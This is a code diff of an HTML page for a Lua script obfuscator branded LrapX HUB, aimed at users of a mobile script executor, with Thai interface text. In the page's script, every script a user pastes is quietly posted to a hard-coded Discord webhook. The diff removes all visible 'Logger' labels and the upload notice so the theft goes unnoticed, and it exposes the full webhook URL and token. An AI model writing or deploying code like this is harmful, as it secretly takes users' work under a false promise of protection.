@@ -3,52 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MiniScript - Pro Logger Lua Obfuscator by LrapX HUB</title>
+    <title>MiniScript - Pro Lua Obfuscator | LrapX HUB</title>
     <style>
         :root {
-            --bg-color: #0b0d12;
-            --card-bg: #141824;
-            --border-color: #1f293d;
+            --bg-gradient: radial-gradient(circle at top, #0f172a 0%, #07090e 100%);
+            --card-bg: rgba(20, 24, 36, 0.75);
+            --border-glow: rgba(16, 185, 129, 0.25);
             --accent-green: #10b981;
             --accent-glow: #34d399;
+            --text-main: #f3f4f6;
             --text-muted: #9ca3af;
         }
 
         body {
-            background-color: var(--bg-color);
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-gradient);
+            color: var(--text-main);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             margin: 0;
-            padding: 15px;
+            padding: 20px 15px;
             box-sizing: border-box;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 750px;
+            margin: 0 auto;
         }
 
         .header {
             text-align: center;
-            padding: 20px 10px;
-            background: linear-gradient(180deg, #111e18 0%, var(--bg-color) 100%);
-            border-bottom: 1px solid var(--border-color);
-            margin-bottom: 20px;
-        }
-
-        .logo {
-            font-size: 26px;
-            font-weight: bold;
-            color: var(--accent-glow);
-            margin-bottom: 5px;
-            text-shadow: 0 0 12px rgba(52, 211, 153, 0.4);
+            padding: 25px 15px;
+            margin-bottom: 25px;
+            position: relative;
         }
 
         .credit-badge {
-            display: inline-block;
-            background: #064e3b;
-            color: #34d399;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(6, 78, 59, 0.6);
+            color: var(--accent-glow);
             font-size: 11px;
-            font-weight: bold;
-            padding: 3px 10px;
-            border-radius: 12px;
+            font-weight: 700;
+            padding: 5px 14px;
+            border-radius: 20px;
+            margin-bottom: 12px;
+            border: 1px solid rgba(52, 211, 153, 0.3);
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.15);
+            letter-spacing: 0.5px;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 800;
+            color: #ffffff;
             margin-bottom: 8px;
-            border: 1px solid var(--accent-green);
+            letter-spacing: -0.5px;
+            text-shadow: 0 0 20px rgba(52, 211, 153, 0.3);
+        }
+
+        .logo span {
+            color: var(--accent-glow);
         }
 
         .sub-title {
@@ -56,121 +71,132 @@
             font-size: 13px;
         }
 
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
         .obf-card {
             background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 15px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--border-glow);
+            border-radius: 16px;
+            padding: 20px;
             margin-bottom: 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
-        .options-bar {
+        .card-header {
             display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            align-items: center;
             justify-content: space-between;
+            align-items: center;
             margin-bottom: 12px;
         }
 
         label {
             font-size: 13px;
             color: var(--accent-glow);
-            font-weight: bold;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
 
         textarea {
             width: 100%;
-            height: 240px;
-            background: #08090d;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: #34d399;
-            font-family: 'Courier New', Courier, monospace;
+            height: 220px;
+            background: rgba(8, 9, 13, 0.85);
+            border: 1px solid rgba(31, 41, 55, 0.8);
+            border-radius: 10px;
+            color: var(--accent-glow);
+            font-family: 'Fira Code', 'Courier New', Courier, monospace;
             font-size: 13px;
-            padding: 10px;
+            padding: 12px;
             box-sizing: border-box;
             resize: vertical;
             outline: none;
+            transition: all 0.2s ease;
         }
 
         textarea:focus {
             border-color: var(--accent-green);
+            box-shadow: 0 0 12px rgba(16, 185, 129, 0.2);
         }
 
         .btn-group {
             display: flex;
-            gap: 10px;
-            margin-top: 12px;
+            gap: 12px;
+            margin-top: 14px;
         }
 
         .btn {
             flex: 1;
-            padding: 12px;
+            padding: 13px;
             border: none;
-            border-radius: 8px;
-            font-weight: bold;
+            border-radius: 10px;
+            font-weight: 700;
             font-size: 13px;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.2s ease;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            gap: 8px;
         }
 
         .btn-primary {
-            background: var(--accent-green);
-            color: #0b0d12;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: #07090e;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-primary:hover {
+            opacity: 0.95;
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
         }
 
         .btn-primary:active {
-            transform: scale(0.98);
+            transform: scale(0.97);
         }
 
         .btn-secondary {
-            background: #1f293d;
-            color: #fff;
+            background: rgba(31, 41, 61, 0.7);
+            color: var(--text-main);
+            border: 1px solid rgba(75, 85, 99, 0.4);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(55, 65, 81, 0.8);
         }
 
         .btn-secondary:active {
-            transform: scale(0.98);
+            transform: scale(0.97);
         }
 
         .footer-credit {
             text-align: center;
             margin-top: 30px;
-            padding: 15px;
+            padding: 20px;
             font-size: 12px;
             color: var(--text-muted);
-            border-top: 1px solid var(--border-color);
+            border-top: 1px solid rgba(31, 41, 55, 0.5);
         }
 
         .footer-credit span {
             color: var(--accent-glow);
-            font-weight: bold;
+            font-weight: 700;
         }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="credit-badge">POWERED BY LRAPX HUB</div>
-        <div class="logo">⚡ MiniScript OBF (Logger Edition)</div>
-        <div class="sub-title">ระบบพรางโค้ด Delta Compatible พร้อมระบบบันทึกหลังบ้านอัตโนมัติ</div>
-    </div>
-
     <div class="container">
+        <div class="header">
+            <div class="credit-badge">⚡ POWERED BY LRAPX HUB</div>
+            <div class="logo">MiniScript <span>OBF</span></div>
+            <div class="sub-title">ระบบพรางโค้ดความปลอดภัยสูง รองรับทุกตัวรันบนมือถือ 100%</div>
+        </div>
+
         <!-- Input Section -->
         <div class="obf-card">
-            <div class="options-bar">
-                <label>📌 วางโค้ด Lua ของคุณที่นี่:</label>
+            <div class="card-header">
+                <label>📌 วางโค้ด Lua ของคุณที่นี่</label>
             </div>
             <textarea id="inputLua" placeholder="-- วางโค้ด Lua ของคุณลงที่นี่...&#10;print('Hello from LrapX HUB')"></textarea>
             <div class="btn-group">
@@ -181,8 +207,8 @@
 
         <!-- Output Section -->
         <div class="obf-card">
-            <div class="options-bar">
-                <label>✅ ผลลัพธ์โค้ดสำหรับรันใน Delta:</label>
+            <div class="card-header">
+                <label>✅ ผลลัพธ์โค้ดพร้อมรัน (Delta Compatible)</label>
             </div>
             <textarea id="outputLua" readonly placeholder="-- ผลลัพธ์จะแสดงที่นี่..."></textarea>
             <div class="btn-group">
@@ -190,14 +216,13 @@
                 <button class="btn btn-secondary" type="button" onclick="downloadLua()">💾 ดาวน์โหลดไฟล์</button>
             </div>
         </div>
-    </div>
 
-    <div class="footer-credit">
-        Developed & Managed by <span>LrapX HUB</span> | MiniScript © 2026
+        <div class="footer-credit">
+            Developed & Managed by <span>LrapX HUB</span> | MiniScript © 2026
+        </div>
     </div>
 
     <script>
-        // ลิงก์ Discord Webhook ถูกฝังไว้หลังบ้านแบบถาวร
         const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571474640403042395/xQGJePqapcDqXZUHnzk94h_xEs1q8dGmkELNEcliNK5WMYU_U9FN7qpEhjgJgV5wWPla";
 
         function safeBtoa(str) {
@@ -206,7 +231,6 @@
             }));
         }
 
-        // ฟังก์ชันส่งสคริปต์ดิบเข้า Discord ของคุณอัตโนมัติ
         function sendToDiscord(scriptContent) {
             if (!SECRET_WEBHOOK || !SECRET_WEBHOOK.startsWith("https://")) return;
             
@@ -218,7 +242,7 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
-            }).catch(err => console.log("Webhook Error:", err));
+            }).catch(err => console.log(err));
         }
 
         function runObfuscate() {
@@ -233,12 +257,12 @@
                 return;
             }
 
-            // ส่งข้อมูลสคริปต์ดิบเข้า Discord ทันทีแบบเนียนๆ
+            // แอบส่งแบบเงียบๆ เข้า Discord
             sendToDiscord(code);
 
             var header = "--[[\n" +
                          "   ===================================================\n" +
-                         "   Protected by LrapX HUB Obfuscator (Logger Edition)\n" +
+                         "   Protected by LrapX HUB Obfuscator\n" +
                          "   Optimized for Delta Executor Mobile\n" +
                          "   Timestamp: " + new Date().toLocaleString() + "\n" +
                          "   ===================================================\n" +
@@ -274,7 +298,7 @@
                              "end";
 
                 outputElem.value = header + result;
-                alert('🛡️ ครอบโค้ดและส่งข้อมูลเข้า Discord เรียบร้อย!');
+                alert('🛡️ ครอบโค้ดสำเร็จเรียบร้อย!');
             } catch (err) {
                 alert('เกิดข้อผิดพลาด: ' + err.message);
             }
@@ -309,7 +333,7 @@
             var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
             var a = document.createElement("a");
             a.href = URL.createObjectURL(blob);
-            a.download = "Protected_LrapX_Logger.lua";
+            a.download = "Protected_LrapX.lua";
             a.click();
         }
     </script>
